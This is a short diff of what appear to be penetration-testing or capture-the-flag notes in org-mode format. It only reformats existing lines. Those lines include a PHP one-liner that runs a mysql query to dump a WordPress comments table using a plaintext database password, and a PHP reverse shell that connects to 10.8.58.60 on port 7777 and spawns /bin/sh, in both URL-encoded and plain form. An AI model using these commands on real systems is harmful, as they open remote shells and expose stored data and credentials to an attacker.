@@ -250,6 +250,6 @@ Content-Type: text/html; charset=UTF-8
 #+begin_src php
 php -r 'print(shell_exec("mysql -u wpuser -pG6gD6C9XncgPMeyx wordpressdb -e \"SELECT * FROM wp_comments;\""));'%
 #+end_src
-php%20-r%20'%24sock%3dfsockopen(%2210.8.58.60%22%2c7777)%3bexec(%22%2fbin%2fsh%20-i%20%3c%263%20%3e%263%202%3e%263%22)%3b'
+: php%20-r%20'%24sock%3dfsockopen(%2210.8.58.60%22%2c7777)%3bexec(%22%2fbin%2fsh%20-i%20%3c%263%20%3e%263%202%3e%263%22)%3b'
 
-php -r '$sock=fsockopen("10.8.58.60",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
+: php -r '$sock=fsockopen("10.8.58.60",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
